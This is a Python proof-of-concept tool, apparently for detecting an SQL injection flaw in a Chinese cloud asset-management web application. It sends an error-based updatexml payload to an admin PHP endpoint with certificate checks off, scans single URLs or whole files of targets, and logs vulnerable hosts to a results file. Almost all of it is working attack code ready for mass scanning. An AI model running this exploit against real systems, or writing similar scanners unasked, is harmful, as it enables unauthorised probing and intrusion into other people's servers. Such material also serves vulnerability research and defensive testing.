import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    bt = """
_________  _______________  ______  
\______  \/  __  \______  \/  __  \ 
    /    />      <   /    />      < 
   /    //   --   \ /    //   --   \
  /____/ \______  //____/ \______  /
                \/               \/ 
"""
    print(bt)

def poc(url):
    print(f"[*] 正在检测: {url}")
    
    # 构建完整URL
    if not url.startswith("http"):
        url = "http://" + url
    
    if not url.endswith("/"):
        url = url + "/"
    
    target = url + "adminx/imaRead.make.php?act=remake"
    
    payload = "feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }
    
    try:
        print(f"[*] 请求目标: {target}")
        response = requests.post(target, headers=headers, data=payload, timeout=10, verify=False)
        
        print(f"[*] 状态码: {response.status_code}")
        print(f"[*] 响应长度: {len(response.text)}")
    
        if response.status_code == 200 and "XPATH" in response.text:
            print(f"[+] {url} 存在漏洞！")
            with open("result.txt", "a", encoding="utf-8") as f:
                f.write(f"{url}\n")
            return True
        else:
            print(f"[-] {url} 不存在漏洞")
            return False
            
    except requests.exceptions.Timeout:
        print(f"[-] {url} 请求超时")
    except requests.exceptions.ConnectionError:
        print(f"[-] {url} 连接错误")
    except Exception as e:
        print(f"[-] {url} 请求失败: {e}")
    
    return False

def main():
    banner()
    parser = argparse.ArgumentParser(description="百易云资产SQL注入漏洞检测工具")
    parser.add_argument("-u", "--url", help="单个URL检测")
    parser.add_argument("-f", "--file", help="批量URL检测")
    args = parser.parse_args()
    
    print("[*] 工具启动...")
    
    if args.url:
        print(f"[*] 检测目标: {args.url}")
        poc(args.url)
    elif args.file:
        print(f"[*] 从文件读取目标: {args.file}")
        with open(args.file, "r", encoding="utf-8") as f:
            urls = [line.strip() for line in f.readlines() if line.strip()]
        print(f"[*] 共 {len(urls)} 个目标")
        for url in urls:
            poc(url)
    else:
        print("[-] 请使用 -u 指定URL 或 -f 指定文件")
        print("示例: python sql.py -u http://127.0.0.1")
        print("示例: python sql.py -f urls.txt")

if __name__ == "__main__":
    main()